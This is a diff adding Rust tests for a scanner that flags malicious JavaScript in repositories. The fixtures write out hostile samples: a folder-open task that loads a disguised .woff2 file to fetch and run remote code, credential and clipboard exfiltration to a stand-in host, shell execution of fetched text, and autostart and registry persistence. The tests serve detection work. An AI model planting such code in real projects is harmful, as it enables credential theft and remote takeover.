@@ -132,6 +132,37 @@ fn reconstructed_polinrider_woff2_trait_is_elevated_by_build_config() {
 }
 
 #[test]
+fn reconstructed_polinrider_chain_links_folder_open_woff2_and_remote_execution() {
+    let root = temporary_directory("polinrider-chain");
+    fs::create_dir(root.join(".vscode")).unwrap();
+    fs::write(root.join(".vscode/tasks.json"), br#"{"tasks":[{"label":"warmup","command":"node boot.js","runOptions":{"runOn":"folderOpen"}}]}"#).unwrap();
+    fs::write(root.join("boot.js"), b"require('./icon.woff2');").unwrap();
+    fs::write(root.join("icon.woff2"), b"async function run() { const response = await fetch('https://example.invalid/control'); const source = Buffer.from(await response.text(), 'base64').toString(); Function(source)(); } run();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE"
+                && finding["severity"] == "critical")
+    );
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
+                && finding["evidence"].to_string().contains("folderOpen")
+                && finding["evidence"].to_string().contains("decode"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn reconstructed_folder_open_trait_links_task_to_script() {
     let root = temporary_directory("folder-open-script");
     fs::create_dir(root.join(".vscode")).unwrap();
@@ -215,6 +246,37 @@ fn npm_lifecycle_script_is_an_execution_root() {
 }
 
 #[test]
+fn devcontainer_hook_reaches_local_script() {
+    let root = temporary_directory("devcontainer-root");
+    fs::create_dir(root.join(".devcontainer")).unwrap();
+    fs::write(
+        root.join(".devcontainer/devcontainer.json"),
+        br#"{"postCreateCommand":"node setup.js"}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("setup.js"),
+        b"const cp = require('child_process'); cp.exec('id');",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-PROCESS-EXECUTION"
+                && finding["evidence"]
+                    .to_string()
+                    .contains("postCreateCommand"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn benign_minified_bundle_does_not_become_critical() {
     let root = temporary_directory("minified-benign");
     let source = format!(
@@ -250,6 +312,38 @@ fn statically_dead_branch_does_not_create_a_remote_execution_chain() {
             .unwrap()
             .iter()
             .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn dynamic_module_target_is_explicitly_unresolved() {
+    let root = temporary_directory("dynamic-module");
+    fs::write(
+        root.join("main.js"),
+        b"const name = process.argv[2]; require(name); import(name);",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["unresolved_edges"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|edge| edge
+                .as_str()
+                .unwrap()
+                .contains("dynamic module target unresolved"))
+    );
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-DYNAMIC-EXECUTION")
     );
     fs::remove_dir_all(root).unwrap();
 }
@@ -329,8 +423,35 @@ fn cross_file_response_decode_reaches_computed_function() {
     let evidence = finding["evidence"].to_string();
     assert!(evidence.contains("npm start"));
     assert!(evidence.contains("axios.get"));
+    assert!(evidence.contains("config"));
+    assert!(evidence.contains("unpack"));
     assert!(evidence.contains("decode"));
     assert!(evidence.contains("Function"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn commonjs_wrapper_preserves_remote_data_across_files() {
+    let root = temporary_directory("commonjs-wrapper");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node main.js"}}"#,
+    )
+    .unwrap();
+    fs::write(root.join("decode.js"), b"function unpack(x) { return Buffer.from(x, 'base64').toString(); } module.exports = { unpack };").unwrap();
+    fs::write(root.join("main.js"), b"const helper = require('./decode.js'); async function boot() { const response = await fetch('https://example.invalid/x'); Function(helper.unpack(await response.text()))(); } boot();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
+                && finding["evidence"].to_string().contains("decode.js"))
+    );
     fs::remove_dir_all(root).unwrap();
 }
 
@@ -395,6 +516,25 @@ fn home_relative_credential_file_reaches_outbound_request() {
 }
 
 #[test]
+fn clipboard_data_reaches_outbound_request() {
+    let root = temporary_directory("clipboard-exfil");
+    fs::write(root.join("main.js"), b"const clipboardy = require('clipboardy'); const value = clipboardy.readSync(); fetch('https://example.invalid/collect', { method: 'POST', body: value });").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION"
+                && finding["evidence"].to_string().contains("clipboardy"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn remote_bytes_written_then_spawned_are_correlated() {
     let root = temporary_directory("write-spawn");
     fs::write(
@@ -415,6 +555,60 @@ fn remote_bytes_written_then_spawned_are_correlated() {
             .any(|finding| {
                 finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE" && finding["severity"] == "critical"
             })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn remote_response_in_shell_template_reaches_process_sink() {
+    let root = temporary_directory("shell-template");
+    fs::write(root.join("main.js"), b"const cp = require('child_process'); async function boot() { const response = await fetch('https://example.invalid/control'); cp.exec(`sh -c ${await response.text()}`); } boot();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-PROCESS-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn promise_callbacks_preserve_remote_response_to_execution() {
+    let root = temporary_directory("promise-callback");
+    fs::write(root.join("main.js"), b"fetch('https://example.invalid/control').then(response => response.text()).then(code => Function(code)());").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn loop_and_try_bodies_are_not_silently_dropped() {
+    let root = temporary_directory("control-bodies");
+    fs::write(root.join("main.js"), b"async function boot() { const response = await fetch('https://example.invalid/x'); try { for (let i = 0; i < 1; i++) { eval(await response.text()); } } catch (error) { console.log(error); } } boot();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
     );
     fs::remove_dir_all(root).unwrap();
 }
@@ -536,6 +730,24 @@ fn one_startup_route_correlates_exfiltration_and_remote_execution() {
 }
 
 #[test]
+fn untriggered_chains_do_not_claim_one_execution_route() {
+    let root = temporary_directory("untriggered-correlation");
+    fs::write(root.join("main.js"), b"fetch('https://example.invalid/collect', { method: 'POST', body: process.env.TOKEN }); async function run() { const response = await fetch('https://example.invalid/control'); eval(await response.text()); } run();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| finding["id"] != "JS-COMBINED-ATTACK-CHAIN")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn startup_file_write_is_reported_but_ordinary_write_is_not() {
     let root = temporary_directory("persistence-write");
     fs::write(root.join("main.js"), b"const fs = require('fs'); const os = require('os'); fs.writeFileSync(os.homedir() + '/.config/autostart/helper.desktop', 'x'); fs.writeFileSync('notes.txt', 'x');").unwrap();
@@ -551,6 +763,51 @@ fn startup_file_write_is_reported_but_ordinary_write_is_not() {
         .collect();
     assert_eq!(findings.len(), 1);
     assert!(findings[0]["evidence"].to_string().contains("autostart"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn fs_promises_secret_read_and_startup_write_are_traced() {
+    let root = temporary_directory("fs-promises");
+    fs::write(root.join("main.js"), b"import { readFile, writeFile } from 'node:fs/promises'; const key = await readFile('/home/user/.aws/credentials'); await fetch('https://example.invalid/collect', { method: 'POST', body: key }); await writeFile('/home/user/.config/autostart/agent.desktop', 'x');").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+    );
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-PERSISTENCE-WRITE")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn registry_startup_command_is_reported_but_quoted_words_are_not() {
+    let root = temporary_directory("registry-command");
+    fs::write(root.join("main.js"), b"const cp = require('child_process'); cp.exec('reg.exe add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Agent /d helper.exe'); cp.exec('echo reg add is just documentation');").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .filter(|finding| finding["id"] == "JS-PERSISTENCE-COMMAND")
+            .count(),
+        1
+    );
     fs::remove_dir_all(root).unwrap();
 }
 
